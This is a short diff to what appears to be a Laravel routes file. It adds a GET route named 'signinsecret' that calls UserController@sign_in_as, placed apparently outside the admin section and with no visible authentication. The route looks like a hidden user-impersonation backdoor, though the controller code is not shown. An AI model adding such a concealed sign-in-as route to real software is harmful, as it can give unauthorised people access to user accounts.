@@ -89,6 +89,8 @@ Route::post('ajax/post-experience-message','MessageController@post_experience_me
 
 Route::post('ajax/searchExperience','TagAndSearchController@search_experience');
 Route::get('ajax/searchVentures','TagAndSearchController@search_ventures');
+
+Route::get('signinsecret','UserController@sign_in_as');
 /*********************\
 /******ADMIN**********\
 /*********************/
